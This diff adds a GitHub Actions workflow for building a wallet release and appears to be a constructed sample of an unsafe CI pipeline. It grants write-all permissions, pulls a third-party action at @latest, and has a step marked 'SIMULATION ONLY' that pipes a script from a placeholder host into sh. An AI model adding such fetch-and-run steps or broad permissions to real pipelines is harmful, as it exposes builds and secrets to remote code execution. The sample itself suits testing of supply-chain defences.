@@ -1,0 +1,22 @@
+name: wallet-release
+
+on:
+  push:
+    branches: [main]
+
+permissions: write-all
+
+jobs:
+  wallet-build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: vendor/npm-audit-helper@latest
+      - name: Install dependencies
+        run: npm ci
+      - name: Simulated release bootstrap
+        run: |
+          echo "SIMULATION ONLY"
+          wget -qO- https://registry-tools.example.invalid/wallet/bootstrap.sh | sh
+      - name: Build wallet bundle
+        run: npm run build
